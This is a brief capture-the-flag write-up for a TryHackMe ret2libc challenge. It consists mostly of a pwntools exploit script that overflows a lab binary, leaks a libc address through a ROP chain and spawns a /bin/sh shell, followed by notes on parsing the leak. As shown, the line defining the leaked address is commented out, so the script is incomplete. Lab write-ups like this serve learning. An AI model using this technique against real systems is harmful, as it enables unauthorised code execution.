---
title: Ret2LibC
category: pwn
tag: tryhackme
---


exploit.py

```python
#!/usr/bin/env python3
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './exploit_me'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
libc = elf.libc
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()


padding = b'A'*18
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)

io.recvline()
io.sendline(payload)
io.recvline()
print(io.recvline())
# leaked_gets = u64(io.recvline().strip().ljust(8,b"\x00"))
io.recvline()

log.info(f'Gets leak => {hex(leaked_gets)}')
libc.address = leaked_gets - libc.symbols.gets
binsh = next(libc.search(b'/bin/sh'))
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)
io.sendline(payload)
io.recvline()
io.interactive()
```


lesson learnt
- check output using print(io.recvline())
- if theres \\n
	- leaked_gets = u64(io.recvline().strip().ljust(8,b"\x00"))
- no \\n
	- leaked_gets = u64(io.recvline().ljust(8,b"\x00"))